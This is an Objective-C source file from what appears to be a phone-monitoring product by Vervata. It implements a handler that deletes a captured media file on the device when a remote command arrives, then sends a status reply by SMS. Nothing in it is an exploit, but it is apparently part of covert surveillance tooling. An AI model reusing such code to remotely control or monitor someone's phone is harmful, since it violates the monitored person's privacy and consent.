/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  DeleteActualMedia
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  14/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "DeleteActualMediaProcessor.h"
#import "EventRepository.h"
#import "MediaEvent.h"

@interface DeleteActualMediaProcessor (PrivateAPI)
- (BOOL) isValidArgs;
- (void) processDeleteActualMedia;
- (void) sendReplySMS: (NSUInteger) aStatusCode;
- (void) deleteActualMediaException:(NSUInteger ) aErrorCode;
- (void) sendReplySMS;
@end

@implementation DeleteActualMediaProcessor

/**
 - Method Name:initWithRemoteCommandData
 - Purpose:This method is used to initialize the deleteActualMediaProcessor class
 - Argument list and description:aRemoteCmdData (RemoteCmdData)
 - Return description: self (DeleteActualMediaProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"DeleteActualMediaProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the DeleteActualMediaProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"DeleteActualMediaProcessor--->doProcessingCommand");
	if ([self isValidArgs])	[self processDeleteActualMedia];
	else [self deleteActualMediaException:kCmdExceptionErrorInvalidCmdFormat];
}

#pragma mark DeleteActualMediaProcessor PrivateAPI Methods

/**
 - Method name: processDeleteActualMedia
 - Purpose:This method is used to process delete actual media
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) processDeleteActualMedia{
	DLog (@"DeleteActualMediaProcessor--->deleteActualMediaException");
	id <EventRepository> eventRep=[[RemoteCmdUtils sharedRemoteCmdUtils] mEventRepository];
	MediaEvent *media=(MediaEvent *)[eventRep actualMedia:[[[mRemoteCmdData mArguments]objectAtIndex:2] intValue]];
	NSString *mediaPath=[media fullPath];
	NSFileManager *fileManager=[NSFileManager defaultManager];
	if ([fileManager removeItemAtPath:mediaPath error:nil]) {
		[self sendReplySMS:_SUCCESS_];
	}
	else {
		[self sendReplySMS:kPairingIDNotFound];
	}
}

/**
 - Method name: isValidArgs
 - Purpose:This method is used to validate Args
 - Argument list and description: No Argument
 - Return description: BOOL
*/

- (BOOL) isValidArgs {
	BOOL isValid=NO;
	NSArray *args=[mRemoteCmdData mArguments];
	if ([args count]>2) {
		NSString *argString=[args objectAtIndex:2];
		isValid=[RemoteCmdProcessorUtils isDigits:argString];
	}
	return isValid;
}

/**
 - Method name: deleteActualMediaException
 - Purpose:This method is invoked when delete actual media process is failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) deleteActualMediaException:(NSUInteger) aErrorCode {
	DLog (@"DeleteActualMediaProcessor--->deleteActualMediaException")
	FxException* exception = [FxException exceptionWithName:@"deleteActualMediaException" andReason:@"Delete Actual Media error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name:sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMS: (NSUInteger) aStatusCode {
	DLog (@"DeleteActualMediaProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:aStatusCode];
	if (aStatusCode!=_SUCCESS_) {
		messageFormat=[NSString stringWithFormat:@"%@%@",messageFormat,[[mRemoteCmdData mArguments] objectAtIndex:2]];
	}
					   
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
